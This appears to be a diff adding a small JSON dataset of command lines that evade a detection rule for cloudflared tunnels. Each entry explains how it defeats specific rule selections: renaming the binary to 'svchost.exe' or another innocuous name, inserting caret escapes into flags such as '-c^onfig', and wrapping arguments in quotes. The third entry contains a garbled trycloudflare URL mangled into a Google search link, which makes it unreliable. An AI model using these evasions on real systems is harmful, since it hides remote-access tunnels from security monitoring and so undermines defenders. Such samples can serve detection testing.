@@ -1,0 +1,14 @@
+[
+{
+"output": "C:\temp\svchost.exe tunnel run -c^onfig config.yaml -t^oken secret_token",
+"explanation": "Renaming the binary (e.g., to 'svchost.exe') evades the 'filter_main_known_names' image path filter. Additionally, inserting the caret (^) escape character into the flag names (e.g., '-c^onfig') breaks the literal string matches required by the 'selection_tunnel' detection logic, while the cloudflared process correctly interprets these flags."
+},
+{
+"output": "copy C:\cloudflared.exe C:\temp\app.exe && C:\temp\app.exe tunnel cleanup -conf^ig config.yaml -connector-id 12345",
+"explanation": "Renaming the executable bypasses the image filter. Using the caret (^) within the '-config' flag breaks the exact string match for 'selection_cleanup' in the telemetry, while still allowing the utility to function as intended."
+},
+{
+"output": "C:\temp\utility.exe "tunnel" "run" "-url" "[https://test.trycloudflare.com](https://www.google.com/search?q=https://test.trycloudflare.com)"",
+"explanation": "Renaming the binary avoids the image-based exclusion filter. Wrapping the arguments in double quotes interrupts the contiguous string matching for 'selection_accountless', effectively bypassing the detection rule."
+}
+]
